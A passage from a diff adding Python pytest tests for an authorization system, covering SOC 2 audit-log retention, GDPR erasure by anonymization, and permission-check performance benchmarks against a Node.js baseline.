+                'retention_period_days': 2555,  # 7 years for SOC 2
+                'retention_classification': 'security_audit',
+                'data_subject': event.get('user_id'),
+                'deletion_date': (datetime.utcnow() + timedelta(days=2555)).isoformat()
+            })
+            audit_events_with_retention.append(event_with_retention)
+
+        # Validate retention metadata
+        for event in audit_events_with_retention:
+            assert 'retention_period_days' in event
+            assert 'deletion_date' in event
+            assert event['retention_period_days'] > 0
+
+        # Test 3: Right to erasure (GDPR Article 17)
+        gdpr_user_id = 'gdpr_erasure_user_456'
+        
+        # Simulate user data erasure request
+        erasure_audit_events = [
+            event for event in self.audit_events 
+            if event.get('user_id') == gdpr_user_id
+        ]
+        
+        # After erasure, events should be anonymized
+        for event in erasure_audit_events:
+            anonymized_event = event.copy()
+            anonymized_event['user_id'] = 'ANONYMIZED'
+            anonymized_event['data_subject'] = 'ERASED'
+            anonymized_event['erasure_date'] = datetime.utcnow().isoformat()
+            
+            # Verify anonymization preserves audit value
+            assert 'event_type' in anonymized_event  # Audit trail preserved
+            assert anonymized_event['user_id'] == 'ANONYMIZED'  # PII removed
+
+    def teardown_method(self):
+        """Validate overall audit and compliance posture."""
+        # Compliance summary
+        total_audit_events = len(self.audit_events)
+        total_violations = len(self.compliance_violations)
+        
+        print(f"Audit Events Generated: {total_audit_events}")
+        print(f"Compliance Violations: {total_violations}")
+        
+        # Zero tolerance for compliance violations
+        assert total_violations == 0, "Zero tolerance for compliance violations"
+        
+        # Minimum audit coverage
+        assert total_audit_events >= 3, "Insufficient audit event coverage"
+        
+        # Audit event quality validation
+        for event in self.audit_events:
+            required_audit_fields = {'event_type', 'user_id', 'timestamp'}
+            event_fields = set(event.keys())
+            
+            missing_fields = required_audit_fields - event_fields
+            assert len(missing_fields) == 0, f"Missing audit fields: {missing_fields}"
+
+
+# Performance benchmarking for authorization system
+@pytest.mark.performance
+class TestAuthorizationPerformanceBenchmarks:
+    """
+    Performance benchmarking tests to ensure ≤10% variance from Node.js baseline.
+    
+    These tests validate that the Python authorization system maintains
+    performance parity with the original Node.js implementation.
+    """
+
+    def setup_method(self):
+        """Set up performance benchmarking environment."""
+        self.auth_manager = get_authorization_manager()
+        self.baseline_times = {
+            'simple_permission_check': 5.0,  # ms - Node.js baseline
+            'complex_permission_check': 12.0,  # ms
+            'resource_ownership_check': 8.0,  # ms
+            'role_hierarchy_check': 15.0,  # ms
+        }
+        self.variance_threshold = 0.10  # 10% variance allowance
+
+    @pytest.mark.asyncio
+    async def test_permission_check_performance_benchmark(self):
+        """Benchmark permission checking performance against Node.js baseline."""
+        context = PermissionContext(
+            user_id='benchmark_user_123',
+            user_permissions={'user.read', 'user.write', 'document.read'},
+            resource_id='benchmark_resource',
+            resource_type='document'
+        )
+        
+        # Warm up
+        for _ in range(10):
+            self.auth_manager._check_user_permissions(context, ['user.read'], allow_owner=False)
+        
+        # Benchmark simple permission check
+        start_time = time.perf_counter()
+        iterations = 1000
+        
+        for _ in range(iterations):
+            result = self.auth_manager._check_user_permissions(
+                context, ['user.read'], allow_owner=False
+            )
+            assert result is True
+        
+        end_time = time.perf_counter()
+        avg_time_ms = ((end_time - start_time) / iterations) * 1000
+        
+        baseline_ms = self.baseline_times['simple_permission_check']
+        variance = abs(avg_time_ms - baseline_ms) / baseline_ms
+        
+        print(f"Simple Permission Check: {avg_time_ms:.2f}ms (baseline: {baseline_ms}ms, variance: {variance:.1%})")
+        
+        assert variance <= self.variance_threshold, f"Performance variance {variance:.1%} exceeds {self.variance_threshold:.1%} threshold"
+
+    @pytest.mark.asyncio
+    async def test_complex_authorization_benchmark(self):
+        """Benchmark complex authorization scenarios against baseline."""
+        complex_context = PermissionContext(
+            user_id='complex_benchmark_user',
+            user_permissions={
+                'user.read', 'user.write', 'document.read', 'document.write',
+                'project.read', 'project.write', 'admin.read'
+            },
+            resource_id='complex_resource',
+            resource_type='document'
+        )
+        
+        complex_permissions = ['document.read', 'document.write', 'project.read']
+        
+        # Benchmark complex permission evaluation
+        start_time = time.perf_counter()
+        iterations = 500
+        
+        for _ in range(iterations):
+            result = self.auth_manager._check_user_permissions(
+                complex_context, complex_permissions, allow_owner=True
+            )
+            assert result is True
+        
+        end_time = time.perf_counter()
+        avg_time_ms = ((end_time - start_time) / iterations) * 1000
+        
+        baseline_ms = self.baseline_times['complex_permission_check']
+        variance = abs(avg_time_ms - baseline_ms) / baseline_ms
+        
+        print(f"Complex Permission Check: {avg_time_ms:.2f}ms (baseline: {baseline_ms}ms, variance: {variance:.1%})")
+        
+        assert variance <= self.variance_threshold, f"Complex authorization variance {variance:.1%} exceeds threshold"
+
+    def teardown_method(self):
+        """Validate overall performance compliance."""
+        print("Authorization Performance Benchmarking Complete")
+        print(f"Variance Threshold: {self.variance_threshold:.1%}")
+        print("All benchmarks must meet ≤10% variance requirement")
